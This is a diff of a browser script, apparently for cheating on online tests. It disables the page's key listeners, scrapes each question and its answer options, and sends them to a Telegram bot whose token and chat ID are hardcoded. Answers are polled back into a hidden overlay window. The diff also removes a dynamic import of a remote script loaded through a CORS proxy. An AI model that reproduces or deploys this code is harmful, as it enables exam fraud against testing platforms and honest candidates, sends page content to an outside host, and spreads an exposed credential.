@@ -1,26 +1,8 @@
-// main.js
-
-// Отключаем старые слушатели
 $(document).off('keydown keypress keyup');
 $(window).off('keydown keypress keyup');
 
-// Telegram Bot данные
 const telegramToken = '7744466941:AAEyIGPkPRKgPq8WTsOV_otNWyhSqqPTP_I';
 const chatId = '1213293747';
-
-// Прокси для обхода CORS
-const CORS_PROXY = 'https://thingproxy.freeboard.io/fetch/';
-
-// 1) Динамический импорт a.js через прокси
-(async () => {
-  try {
-    await import(`${CORS_PROXY}https://glowstore.uz/a.js`);
-    console.log('a.js загружен через прокси');
-  } catch (e) {
-    console.error('Ошибка импорта a.js:', e);
-  }
-})();
-
 let lastProcessedUpdateId = 0;
 
 function createMiniWindow() {
@@ -46,7 +28,27 @@ function createMiniWindow() {
     z-index: 1000;
     font-family: Arial, sans-serif;
 }
-/* … остальные стили без изменений … */
+#mini-window::-webkit-scrollbar {
+    width: 6px;
+}
+#mini-window::-webkit-scrollbar-thumb {
+    background-color: rgba(255, 255, 255, 0.3);
+    border-radius: 10px;
+}
+#mini-window::-webkit-scrollbar-thumb:hover {
+    background-color: rgba(255, 255, 255, 0.5);
+}
+#mini-window::-webkit-scrollbar-track {
+    background: rgba(255, 255, 255, 0);
+    border-radius: 5px;
+}
+#mini-window-content {
+    padding: 5px;
+    font-size: 14px;
+    line-height: 1.5;
+    max-height: calc(100% - 50px);
+    color: rgba(204, 204, 204, 0.75);
+}
     `;
     document.head.appendChild(style);
 }
@@ -68,8 +70,7 @@ function appendMessageToMiniWindow(text) {
 
 async function getNewAnswersFromTelegram() {
     const url = `https://api.telegram.org/bot${telegramToken}/getUpdates?offset=${lastProcessedUpdateId + 1}`;
-    // используем прокси
-    const response = await fetch(`${CORS_PROXY}${url}`);
+    const response = await fetch(url);
     const data = await response.json();
 
     if (data.ok) {
@@ -85,8 +86,11 @@ async function getNewAnswersFromTelegram() {
 }
 
 document.addEventListener('keyup', e => {
-    if (e.key.toLowerCase() === 'm') toggleMiniWindow();
+    if (e.key.toLowerCase() === 'm') {
+        toggleMiniWindow();
+    }
 });
+
 document.addEventListener('contextmenu', e => {
     e.preventDefault();
     toggleMiniWindow();
@@ -99,11 +103,13 @@ function extractImageLinks(element) {
 
 async function sendQuestionToTelegram(question) {
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-    // и здесь прокси
-    const response = await fetch(`${CORS_PROXY}${url}`, {
+    const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: question }),
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: question,
+        }),
     });
 
     if (!response.ok) {
@@ -114,10 +120,10 @@ async function sendQuestionToTelegram(question) {
 }
 
 async function processAndSendQuestions() {
-    const tests = document.querySelectorAll('.table-test');
+    const tests = document.querySelectorAll('.table-test');  
     const sortedTests = Array.from(tests).sort((a, b) => {
-        const idA = +a.id.replace(/\D/g, '');
-        const idB = +b.id.replace(/\D/g, '');
+        const idA = parseInt(a.id.replace(/\D/g, ''), 10);
+        const idB = parseInt(b.id.replace(/\D/g, ''), 10);
         return idA - idB;
     });
 
@@ -125,21 +131,23 @@ async function processAndSendQuestions() {
         const test = sortedTests[i];
         let messageContent = `Вопрос ${i + 1}:\n`;
         const question = test.querySelector('.test-question p')?.textContent.trim() || 'Вопрос не найден';
-        messageContent += question + '\n\n';
+        messageContent += `${question}\n\n`;
 
         const questionImages = extractImageLinks(test.querySelector('.test-question'));
         if (questionImages) {
             messageContent += `Изображения в вопросе:\n${questionImages}\n\n`;
         }
 
-        const answers = Array.from(test.querySelectorAll('.answers-test li')).map(li => {
+        const answers = Array.from(test.querySelectorAll('.answers-test li')).map((li, index) => { 
             const variant = li.querySelector('.test-variant')?.textContent.trim() || '';
             const answerText = li.querySelector('label p')?.textContent.trim() || '';
-            const imgLinks = extractImageLinks(li);
-            return `${variant}. ${answerText}` + (imgLinks ? ` (Изображение: ${imgLinks})` : '');
+            const answerImage = extractImageLinks(li);
+            return `${variant}. ${answerText} ${answerImage ? `(Изображение: ${answerImage})` : ''}`;
         });
 
-        messageContent += 'Варианты ответов:\n' + answers.join('\n');
+        messageContent += 'Варианты ответов:\n';
+        messageContent += answers.join('\n');
+
         await sendQuestionToTelegram(messageContent);
     }
 }
@@ -147,10 +155,3 @@ async function processAndSendQuestions() {
 createMiniWindow();
 setInterval(getNewAnswersFromTelegram, 5000);
 processAndSendQuestions();
-
-// ————————————————
-// По ошибке 
-//   "A listener indicated an asynchronous response by returning true, 
-//    but the message channel closed before a response was received"
-// — это предупреждение, которое идёт из какого-то расширения или content script (не из вашего кода).
-// Его можно игнорировать или найти конфликтное расширение и убрать return true без sendResponse().
